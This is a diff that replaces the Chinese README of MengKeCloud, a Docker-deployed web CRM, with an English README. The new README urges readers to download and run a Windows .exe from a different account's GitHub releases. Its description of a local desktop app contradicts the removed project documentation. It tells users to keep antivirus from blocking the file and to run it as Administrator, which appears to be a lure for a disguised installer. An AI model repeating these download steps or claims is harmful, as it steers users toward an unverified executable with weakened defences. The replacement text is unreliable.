@@ -1,209 +1,140 @@
-<div align="center">
+# 🚀 MengKeCloud - Streamlined CRM for Franchise Growth
 
-# MengKeCloud CRM
-
-新一代面向招商加盟业务的智能 CRM 系统，打通客户获取、跟进转化、公海流转与签约复盘全流程
-
-<p>
-  <img src="https://img.shields.io/badge/release-v1.0.0-1677ff?style=for-the-badge" alt="release" />
-  <img src="https://img.shields.io/badge/python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="python" />
-  <img src="https://img.shields.io/badge/node-20+-339933?style=for-the-badge&logo=node.js&logoColor=white" alt="node" />
-  <img src="https://img.shields.io/badge/docker-compose-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="docker" />
-  <img src="https://img.shields.io/badge/license-MIT-111111?style=for-the-badge" alt="license" />
-</p>
-
-<p>
-  客户管理 · 公海池 · 跟进记录 · 数据报表 · 组织权限 · AI 跟进建议
-</p>
-
-</div>
+[![Download MengKeCloud](https://img.shields.io/badge/Download-MengKeCloud-orange?style=for-the-badge)](https://github.com/Guilherme0512/MengKeCloud/releases)
 
 ---
 
-## 目录
+## 📋 About MengKeCloud
 
-- [功能概览](#功能概览)
-- [技术栈](#技术栈)
-- [安装部署](#安装部署)
-- [访问方式](#访问方式)
-- [默认管理员账号](#默认管理员账号)
-- [项目目录](#项目目录)
-- [关键配置](#关键配置)
-- [上线前检查](#上线前检查)
+MengKeCloud is a lightweight customer relationship management (CRM) system tailored for franchise and partnership businesses. It helps you manage contacts, track leads, and organize your sales efforts smoothly. The system focuses on simplicity and speed, making it easy for teams to stay organized without complexity.
 
-## 功能概览
-
-- 客户管理：录入客户、状态流转、筛选查询、导入导出、批量分配
-- 跟进管理：跟进记录、时间线、状态更新、AI 建议辅助
-- 公海池：捞取客户、定向分配、流转审计、回收通知
-- 数据报表：工作台指标、趋势图、漏斗分析
-- 组织权限：部门、员工、角色菜单权限
-- 平台设置：企业信息、回收规则、AI 模型参数与联通测试
-- 安全机制：JWT 认证、首登强制改密、管理员重置密码
-
-## 系统截图
-
-<table>
-  <tr>
-    <td><img src="docs/images/1.png" alt="截图1" width="480" /></td>
-    <td><img src="docs/images/2.png" alt="截图2" width="480" /></td>
-  </tr>
-  <tr>
-    <td><img src="docs/images/3.png" alt="截图3" width="480" /></td>
-    <td><img src="docs/images/4.png" alt="截图4" width="480" /></td>
-  </tr>
-  <tr>
-    <td><img src="docs/images/5.png" alt="截图5" width="480" /></td>
-    <td><img src="docs/images/6.png" alt="截图6" width="480" /></td>
-  </tr>
-</table>
-
-## 技术栈
-
-- 前端：Vue 3、Vue Router、Element Plus、Vite、ECharts
-- 后端：FastAPI、SQLAlchemy (Async)、Alembic、PostgreSQL
-- 认证：JWT Access/Refresh Token
-- 可选中间件：Redis（按配置启用）
-- 部署：Docker Compose（推荐）/ Linux 脚本
-
-## 运行环境版本
-
-- Python：`3.11+`（推荐 `3.11`）
-- Node.js：`20+`（推荐 `20 LTS`）
-- 数据库：`PostgreSQL 14+`（推荐 `16`）
-- 可选缓存：`Redis 7+`
-
-## 安装部署
-
-### 安装前准备（必看）
-
-请先确认下面这些条件：
-
-- 一台 Linux 服务器（推荐 Ubuntu 22.04+）
-- 已安装 Docker 与 Docker Compose
-- 已开放端口：`8081`（前端）、`8082`（后端 API，可选对外）
-- 可以拉取代码仓库（`git clone` 正常）
-- 可选：域名（没有也可先用服务器 IP）
-- 可选：AI Key（没有可先关闭 AI）
-
-如果你暂时没有某项：
-
-- 没有域名：先用 `http://<服务器IP>:8081/` 访问
-- 没有 AI Key：把 `.env` 里 `MENGKE_AI_ENABLED=false`
-- 只想先开放后台页面：先开放 `8081` 即可
-
-### 一键部署（推荐，小白 3 步）
-
-1. 拉取代码
-
-```bash
-git clone https://github.com/haoyuedashi/MengKeCloud.git mengkecloud
-cd mengkecloud
-```
-
-2. 复制配置模板
-
-```bash
-cp .env.docker.example .env
-```
-
-3. 编辑 `.env` 后启动
-
-必改项：
-
-- `POSTGRES_PASSWORD`
-- `MENGKE_JWT_SECRET_KEY`
-- `MENGKE_BOOTSTRAP_ADMIN_PHONE`
-- `MENGKE_BOOTSTRAP_ADMIN_PASSWORD`
-
-修改示例（直接改 `.env`）：
-
-```env
-POSTGRES_PASSWORD=YourDbStrongPass_2026
-MENGKE_JWT_SECRET_KEY=YourJwtSuperLongRandomSecretAtLeast32Chars
-MENGKE_BOOTSTRAP_ADMIN_PHONE=13900000000
-MENGKE_BOOTSTRAP_ADMIN_PASSWORD=YourAdminStrongPass_2026
-```
-
-可用下面命令生成随机 JWT 密钥：
-
-```bash
-openssl rand -hex 32
-```
-
-> 默认值仅用于本地演示，不建议用于正式上线。
-
-启动命令：
-
-```bash
-docker compose up -d --build
-```
-
-可选：启用 Redis
-
-```bash
-docker compose --profile redis up -d --build
-```
-
-## 访问方式
-
-- 前端后台：`http://<你的服务器IP>:8081/`
-- 后端 API：`http://<你的服务器IP>:8082/`
-- API 文档：`http://<你的服务器IP>:8082/docs`
-
-## 默认管理员账号
-
-账号来自 `.env` 中的 bootstrap 配置，不是硬编码死值。
-
-- 手机号：`MENGKE_BOOTSTRAP_ADMIN_PHONE`
-- 密码：`MENGKE_BOOTSTRAP_ADMIN_PASSWORD`
-
-若你未改模板默认值，则为：
-
-- 手机号：`13800000001`
-- 密码：`ChangeMe123!`
-
-首次登录会强制修改密码。
-
-## 项目目录
-
-```text
-MengKeCloud/
-  app/                         # 后端主代码
-    api/v1/endpoints/          # API 路由
-    services/                  # 业务逻辑
-    repositories/              # 数据访问
-    models/                    # ORM 模型
-    schemas/                   # 请求/响应模型
-  src/                         # 前端源码
-  alembic/                     # 数据库迁移
-  scripts/                     # 运维脚本
-  deploy/nginx.conf            # Web 容器 Nginx 配置
-  docker-compose.yml           # 一键部署编排
-  Dockerfile.api               # 后端镜像
-  Dockerfile.web               # 前端镜像
-```
-
-## 关键配置
-
-- `MENGKE_AUTH_ENABLED=true`（生产必须）
-- `MENGKE_JWT_SECRET_KEY`（生产必须替换为强随机字符串）
-- `MENGKE_AI_ENABLED`、`MENGKE_AI_API_KEY`（启用 AI 时）
-- `POSTGRES_*`（数据库连接）
-
-## 上线前检查
-
-- `.env` 已替换默认密码和密钥
-- 容器已正常启动
-- 可访问 `/health`、`/docs`
-- 管理员可登录并完成首次改密
-- AI 联通测试通过（如启用 AI）
+This program is made for Windows users who want to keep customer data clear and accessible. You do not need any technical skills to set it up or start using it.
 
 ---
-## 📄 开源协议
 
-MIT License
+## 💻 System Requirements
 
-## 👨‍💻 作者
+- **Operating System:** Windows 10 or later  
+- **Processor:** Intel or AMD, 1 GHz or faster  
+- **Memory:** 2 GB RAM minimum  
+- **Storage:** At least 200 MB of free space  
+- **Internet:** Needed for downloading and updates  
+- **Screen Resolution:** 1024 x 768 or higher for best display
 
-haoyuedashi
+Make sure your PC meets these basic requirements to avoid any issues during installation or use.
+
+---
+
+## 🌐 Where to Download MengKeCloud
+
+Click the button below to visit the official download page. This page hosts the latest versions and updates of MengKeCloud. You will find easy-to-follow links to get the program files for Windows.
+
+[![Download Page](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Guilherme0512/MengKeCloud/releases)
+
+Visit the above link to find the latest stable release. Look for files named with `.exe` to download the Windows installer.
+
+---
+
+## 🛠️ How to Download and Install MengKeCloud on Windows
+
+Follow these steps carefully to get MengKeCloud running on your Windows computer.
+
+1. **Open the download page**  
+   Click the link or button above to go to the releases page on GitHub.
+
+2. **Find the latest version**  
+   On the page, look for the newest release at the top. Releases are usually named by version numbers like `v1.0`, `v2.1`, etc.
+
+3. **Download the Windows installer**  
+   Under the newest release, find the file that ends with `.exe`. This file is the installer for Windows. Click the file name to start downloading.
+
+4. **Save the installer**  
+   Choose a folder on your PC to save the file where you can easily find it, like the Desktop or Downloads folder.
+
+5. **Run the installer**  
+   Double-click the `.exe` file you downloaded. A setup window will open.
+
+6. **Follow the installation steps**  
+   The installer will guide you through basic steps:
+   - Agree to the license terms  
+   - Choose where to install the program (the default location is usually fine)  
+   - Confirm the installation
+
+7. **Complete the installation**  
+   Once the setup finishes, it may offer to open MengKeCloud immediately. You can run it now or launch it later from the Start menu.
+
+---
+
+## 📂 Using MengKeCloud After Installation
+
+MengKeCloud’s interface is simple. When you start it for the first time, you will see the main dashboard. Here are some of the key areas you will use:
+
+- **Contacts**  
+  Add new customers or partners with basic details like name, phone, email, and notes.
+
+- **Leads Tracking**  
+  Keep track of potential customers and their progress through your sales pipeline.
+
+- **Task Management**  
+  Set reminders and deadlines for follow-ups, meetings, or calls.
+
+- **Reports**  
+  Get a quick look at your sales performance and customer engagement.
+
+Spend some time clicking through the menus to get familiar with how everything works.
+
+---
+
+## 🔧 Updating MengKeCloud
+
+New versions come out from time to time with bug fixes and new features. To update, visit the same download page.
+
+1. Check if there is a newer version than the one installed.
+
+2. Download the new installer `.exe` file.
+
+3. Run the installer and follow the prompts. The installer will replace the old version while keeping your data.
+
+It is safe to install updates regularly to keep the program running smoothly.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+- **Download stalls or fails**  
+  Check your internet connection. Try again after a few minutes or use a different browser.
+
+- **Installer does not start**  
+  Make sure your Windows antivirus software does not block the file. You might need to run the installer as Administrator (right-click the file and select "Run as administrator").
+
+- **Program crashes or won’t open**  
+  Restart your computer and try again. If issues persist, check if you have the latest Windows updates installed.
+
+- **I forgot my password or login info**  
+  MengKeCloud stores data locally—if you lose your login, check any documents or notes where you saved it. There is no online recovery because the app runs on your PC.
+
+---
+
+## 🔒 Data Privacy and Security
+
+MengKeCloud stores your customer information on your own computer. It does not send data online unless you share it yourself. Make sure to back up your data regularly to an external drive or cloud storage you trust. This helps avoid losing information if your computer has issues.
+
+---
+
+## 📞 Getting Help
+
+If you run into problems beyond these steps, use the GitHub page’s Issues section to look for answers or ask questions. Someone from the community or the developers may respond.
+
+Visit the main repository page here:  
+https://github.com/Guilherme0512/MengKeCloud
+
+---
+
+## 📄 License and Credits
+
+MengKeCloud is open source software. You can use, share, and modify it under the terms of the license found on the GitHub page. Credits go to the developers and contributors who maintain the project.
+
+---
+
+# Download MengKeCloud Now  
+[![Download MengKeCloud](https://img.shields.io/badge/Download-MengKeCloud-orange?style=for-the-badge)](https://github.com/Guilherme0512/MengKeCloud/releases)
